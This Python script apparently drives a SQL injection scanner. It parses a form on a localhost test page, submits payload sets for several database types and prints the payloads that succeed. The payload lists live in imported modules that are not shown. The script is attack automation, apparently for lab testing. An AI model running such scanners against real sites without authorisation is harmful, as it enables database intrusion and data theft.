#! /usr/bin/python3
import bs4
import requests

from sql_injection.entities.generic_entitie import GenericEntitie
from sql_injection.entities.mssql_entitie import MSSQLEntitie
from sql_injection.entities.mysql_entitie import MySQLEntitie
from sql_injection.entities.nosql_entitie import NoSQLEntitie
from sql_injection.entities.oracle_entitie import OracleEntitie

from sql_injection.form import Form
from sql_injection.injection import Injection

from sql_injection.request.request_get import RequestGet
from sql_injection.request.request_post import RequestPost

url = 'http://localhost/sql_injection/index.php'
entities = [GenericEntitie, OracleEntitie, MSSQLEntitie, MySQLEntitie, NoSQLEntitie]

r = requests.get(url)
soup = bs4.BeautifulSoup(r.content.decode(), 'lxml')

form = Form(soup.find('form'))
injection = Injection('Connexion perdu')

method = form.method.lower()

def main():
    for entitie in entities: 
        entitie = entitie()
        print(entitie.name)

        for payload in entitie.payloads: 
            req.set_data(form, payload)
            resp = req.request()
            successful = injection.successful(req, resp)
            if successful: 
                print(successful, payload) 


if method == 'get':
    req = RequestGet(url)

elif method == 'post':
    req = RequestPost(url)

main()